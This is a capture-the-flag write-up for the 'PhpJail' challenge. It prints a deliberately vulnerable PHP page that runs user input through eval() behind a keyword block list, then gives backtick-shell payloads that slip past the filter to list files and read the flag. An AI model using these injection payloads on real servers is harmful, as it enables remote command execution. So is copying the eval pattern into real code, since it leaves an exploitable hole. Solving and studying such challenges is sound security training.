# PhpJail #

## Intended Solution ##

1. View source and you will find
```javascript
			function appendToTerminal($str){
				$("#terminalMain").append("<br/><pre class='terminalBody'>>" + $str.replace("<","&lt;") + "</pre>");
			}
			function appendResponse($str){
				$("#terminalMain").append("<br/><pre class='terminalResponse'>>>" + $str.replace("<","&lt;") + "</pre>");
			}
			$(document).ready(function(){
				$("#input").keypress(function(e){
					if(e.which == 13){
						appendToTerminal($(this).val());
						$.ajax({
							url: "terminal.php",//?code
							type: 'GET',
							data: {cmd: $("#input").val()},
							success: function(response){
								console.log(response);
								if(response.indexOf("error") > 0)
									appendResponse("Syntax error ?.?");
								else
									appendResponse(response);
								var box = document.getElementById('terminalMain');
								box.scrollTop = box.scrollHeight;
							}
						});
						$(this).val("");
					}
				});
			});

```

2. Access `terminal.php?code`, and you will get the source code of `terminal.php`
```php
<?php 
    $sandbox = './sandbox/'.md5($_SERVER['REMOTE_ADDR']); 
    @mkdir($sandbox,0777,true); 
    @chdir($sandbox); 

    function evalFilter($str){ 
        $str = strtolower($str); 
        $filterArr = array('localhost','127.0.0.1','php','eval','exec','ls','cat','find','../','./','/'); 
        foreach($filterArr as $filter) 
            $str = str_replace($filter,"fuck",$str); 
        return $str; 
    } 

    if(isset($_GET["cmd"])){ 
        eval("?>".evalFilter($_GET['cmd'])); 
    } 
    if(isset($_GET["code"])){ 
        highlight_file(__FILE__); 
    } 
?>
```

### Restrict ###
* Php tag
* Some system commands
* Cannot access parent directory

### Bypass ###
* `<?=1;?>` , this is an example of execute php code without php tag.
* User other command
* I don't think it is needed

### Payload ###

* List directory
```
<?=`dir`;?>
```

* Read `flag{do_you_think_it_is_the_real_flag}.php`
```
<?=`strings f*`;?>
```